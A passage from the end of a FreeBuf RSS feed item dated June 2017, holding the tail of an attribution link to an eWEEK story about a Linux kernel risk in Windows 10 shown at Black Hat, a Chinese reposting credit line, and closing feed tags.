href=&quot;http://www.eweek.com/security/risk-from-linux-kernel-hidden-in-windows-10-exposed-at-black-hat&quot;&gt;eWEEK&lt;/a&gt;, 转载请注明作者&lt;b&gt;欧阳洋葱&lt;/b&gt;，与出处&lt;b&gt;FreeBuf专栏&lt;/b&gt;&lt;/p&gt;</description>
<author>鲍弘捷</author>
<guid isPermaLink="false">2017-06-21-27497774</guid>
<pubDate>Wed, 21 Jun 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
